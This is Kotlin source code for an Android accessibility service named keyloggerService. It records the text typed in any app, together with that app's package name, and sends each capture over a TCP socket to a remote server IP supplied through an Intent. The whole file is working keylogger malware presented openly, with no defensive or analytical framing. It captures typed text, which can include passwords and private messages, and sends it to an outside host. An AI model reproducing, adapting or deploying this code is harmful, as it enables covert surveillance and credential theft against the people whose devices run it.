package com.example.socket

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.OutputStreamWriter
import java.net.Socket

class keyloggerService : AccessibilityService() {
    private var serverIp: String? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        serverIp = intent?.getStringExtra("SERVER_IP")  // Recibir la IP del Intent
        return super.onStartCommand(intent, flags, startId)
    }


    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // Check if the event is related to text changes (e.g., typing)
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val typedText = event.text?.toString()
            val packageName = event.packageName.toString()
            // If text exists, log and send it to the server
            if (!typedText.isNullOrEmpty()) {
                Log.d("KeyloggerService", "Keystroke logged: $typedText")
                // Send the keystrokes to the TCP server
                CoroutineScope(Dispatchers.IO).launch {
                    sendToServer("Package name [$packageName] Keystroke [$typedText]")
                }
            }
        }
    }

    override fun onInterrupt() {
        // Handle interruption in service (if needed)
    }

    private fun sendToServer(keystrokes: String) {
//        val serverIp = "192.168.1.102"  // Replace with your server IP
        val serverPort = 12345           // Replace with your server port

        try {
            // Connect to the TCP server
            val socket = Socket(serverIp, serverPort)
            val writer = OutputStreamWriter(socket.getOutputStream())

            // Send the keystrokes
            writer.write(keystrokes)
            writer.flush()

            // Close the connection
            writer.close()
            socket.close()

            Log.d("KeyloggerService", "Keystrokes sent to server")

        } catch (e: Exception) {
            Log.e("KeyloggerService", "Error sending keystrokes: ${e.message}")

        }
    }
}